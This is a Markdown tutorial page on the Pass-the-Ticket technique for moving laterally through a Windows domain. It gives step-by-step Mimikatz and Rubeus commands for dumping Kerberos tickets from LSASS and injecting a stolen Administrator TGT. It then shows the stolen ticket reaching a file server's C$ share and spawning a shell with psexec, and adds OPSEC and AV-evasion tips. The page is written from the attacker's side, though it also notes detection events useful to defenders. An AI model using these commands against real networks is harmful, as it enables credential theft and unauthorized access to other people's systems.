---
title: "Pass the Ticket (PtT) from Windows"
description: "How to steal and inject Kerberos tickets on a compromised Windows machine to move laterally."
tags:
  - password-attacks
  - lateral-movement
  - pass-the-ticket
  - ptt
  - kerberos
  - mimikatz
icon: material/ticket-account
---

# 🎟️ Pass the Ticket (PtT) from Windows

**Pass the Ticket (PtT)** is a lateral movement technique where an attacker extracts a valid Kerberos ticket (TGT or TGS) from a compromised machine and injects it into their own session. This allows the attacker to authenticate to network services without knowing the user's plaintext password or NT hash.

PtT is the modern alternative to Pass the Hash. It is stealthier, leaves fewer event logs, and works even if NTLM authentication is completely disabled on the network.

---

## 1️⃣ Understanding Kerberos Tickets

In Active Directory, the Kerberos protocol uses two types of tickets:

1. **TGT (Ticket Granting Ticket):** Issued by the Domain Controller (KDC) when a user first logs in. It proves identity. A stolen TGT allows you to request access to *any* service the user has permissions for.
2. **TGS (Ticket Granting Service):** Issued by the DC when a user wants to access a specific service (like an SMB share or MSSQL database). A stolen TGS only grants access to that *specific* service.

Tickets are cached in LSASS memory so the user doesn't have to constantly re-authenticate.

---

## 2️⃣ Extracting Tickets (Mimikatz)

If you have Local Administrator or SYSTEM privileges on a compromised Windows machine, you can extract all cached Kerberos tickets from LSASS memory.

### Step 1: Dump all tickets to disk
```cmd
mimikatz # privilege::debug

# Export all tickets to the current directory (.kirbi format)
mimikatz # sekurlsa::tickets /export
```

Mimikatz will dump files with names like:

- `[0;12a3b]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi` (This is a TGT for Administrator)
- `[0;12a3b]-2-1-40a10000-Administrator@cifs-fileserver.corp.local.kirbi` (This is a TGS for the CIFS/SMB service on 'fileserver')

!!! tip
    Look for tickets ending in `krbtgt-DOMAIN.kirbi`. These are TGTs, which are the most valuable because they let you request access to anything.

---

## 3️⃣ Injecting Tickets (Mimikatz)

Once you have a `.kirbi` file, you can inject it into your current logon session.

### Step 1: Clear current tickets
Before injecting a ticket, it's best practice to purge your current session's cached tickets to avoid conflicts.
*(Note: Do this from a new command prompt, as purging tickets might break your existing network connections).*
```cmd
mimikatz # kerberos::purge
```

### Step 2: Inject the ticket
```cmd
mimikatz # kerberos::ptt [0;12a3b]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
```

### Step 3: Verify and execute
You can verify the ticket is in memory using the built-in Windows `klist` command.
```cmd
# Exit mimikatz
C:\> klist

# Access the target service
C:\> dir \\fileserver\C$
C:\> psexec.exe \\fileserver cmd.exe
```
Because the Kerberos ticket is injected into your session, Windows automatically uses it when you try to access `\\fileserver`. No password prompt will appear.

---

## 4️⃣ Performing PtT with Rubeus

**Rubeus** is a C# toolset designed for raw Kerberos interaction and abuses. It is generally preferred over Mimikatz for Kerberos attacks because it is heavily updated, integrates well with Cobalt Strike, and avoids some AV signatures associated with Mimikatz.

### Extracting Tickets
```cmd
# Dump all TGTs from memory
Rubeus.exe dump /tgtdeleg
```

### Injecting Tickets
Rubeus handles tickets in Base64 format instead of `.kirbi` files on disk, making it much stealthier.

```cmd
# Purge current tickets
Rubeus.exe purge

# Inject a Base64-encoded ticket
Rubeus.exe ptt /ticket:<Base64TicketString>
```

---

## 5️⃣ OPSEC Considerations

- **Ticket Lifetimes:** Kerberos tickets expire (usually after 10 hours). You cannot use a stolen ticket indefinitely. Once it expires, you lose access unless you steal a fresh one.
- **Hostname vs. IP Address:** Kerberos relies heavily on SPNs (Service Principal Names), which are tied to hostnames. When using a stolen ticket to access a service (e.g., `dir \\fileserver\C$`), you **must use the hostname (FQDN)**. If you use the IP address (e.g., `dir \\10.10.10.20\C$`), Windows will fall back to NTLM authentication, and the PtT attack will fail.
- **Detection:** Injecting tickets leaves event logs (Event ID 4624 Logon Type 9). Defenders can spot PtT by looking for logons where the source IP does not match the IP where the ticket was originally requested.

---

!!! warning
    **Extracting tickets requires touching LSASS memory.** As with Pass the Hash, using Mimikatz or Rubeus to interact with LSASS will likely trigger EDR alerts unless you use advanced evasion techniques.
